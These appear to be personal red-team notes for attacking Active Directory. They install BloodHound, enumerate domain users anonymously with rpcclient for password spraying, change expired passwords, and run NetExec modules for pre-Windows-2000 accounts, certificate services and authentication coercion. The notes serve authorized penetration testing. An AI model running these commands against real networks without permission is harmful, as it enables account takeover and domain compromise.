

## Setup BloodHound Mac Intel CPU
curl -L https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-darwin-amd64.tar.gz -o bloodhound-cli.tar.gz
tar -xzf bloodhound-cli.tar.gz
./bloodhound-cli install
./bloodhound-cli config get default_password



----- No Creds  ------

$ rpcclient -U 'DOMAIN/USER%PASSWD2025!' DC-IP

└─$ rpcclient -U '' -N 10.0.0.50
rpcclient $> getusername
Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY
querydominfo
enumdomusers     (dumps all the usernames, to later spray against)

** If you find password_expired.... 
Run; chgpasswd <username> <oldpasswd> <newtemppasswd>





------ Low-Priv Credentials -------

nxc ldap -u username -p password -M pre2k
(often no password set and can be changed to login)

nxc ldap -u username -p password -M adcs

nxc smb -u username -p passwd -M coerce_plus
